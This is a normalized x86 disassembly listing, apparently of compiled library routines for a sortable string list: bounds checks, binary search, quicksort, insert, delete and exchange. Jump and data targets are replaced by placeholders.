mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40423c
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_40423c
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40423c
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_402968
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_402968
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_40423c
mov ebx eax
test ebx ebx
je r-xdata
sub_41a4f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a56f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_403f7c
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40423c
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_40449c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a576
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_41a57c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a5f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5fb
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41a608
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a6cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_40449c
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41ad14
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404164
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c830
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a6d2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fa0
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_41a6dc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41a710
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41a740
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b8b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a788
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a78f
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_41a794
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a831
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41a074
xor eax eax
push ebp
push sub_41a814
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41b39c
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_40406c
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a81b
mov eax [ ebp - 0x4 ]
call sub_41a130
retn
sub_41a840
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a8e1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a8e8
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
mov eax [ ebp - 0x4 ]
call sub_41a074
xor eax eax
push ebp
push sub_41a8c4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a130
retn
sub_41a8f0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41a928
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a9cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41d5f0
mov eax [ ebp - 0x4 ]
call sub_41a074
xor eax eax
push ebp
push sub_41a9a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41c68c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e290
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a9ae
mov eax [ ebp - 0x4 ]
call sub_41a130
retn
sub_41a9d8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b8b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41aa23
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa2a
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_41aa30
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41aa7d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40423c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41b600
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa84
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_41aa90
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4058b8
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41aac4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ab07
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404174
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ab0e
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_41ab14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41abc8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41a074
xor edx edx
push ebp
push sub_41abab
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41abb2
mov eax [ ebp - 0x4 ]
call sub_41a130
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40406c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41abd8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ac74
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
jl r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac7b
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fa0
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov eax ebx
call sub_41ad14
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404164
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4042fc
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
sub_41ac84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41acfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41f824
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41f82c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad01
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_420f98
inc esi
dec ebx
jne r-xdata
sub_41ad2c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41ad48
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419eac
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_404a04
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_41adb0
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41a228
jmp r-xdata
sub_41ae4c
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_404a04
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41ae8c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_402968
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404af0
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41aef8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_41a228
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41af54
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41af54
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41af78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41aff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403fd0
pop edi
pop esi
pop ebx
retn
sub_41b02c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41b054
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41b088
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a57c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41b0d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41a228
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a228
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41b128
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41b054
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403fd0
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_402968
sub_41b1a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_41a228
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403fd0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41b1fc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_41a228
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41b23c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41af54
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b23c
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41b2ec
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41b348
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41b23c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41b39c
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41b3d0
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41b434
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41b488
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_40313c
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
mov esp ebp
pop ebp
retn
sub_41b4d4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_403134
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
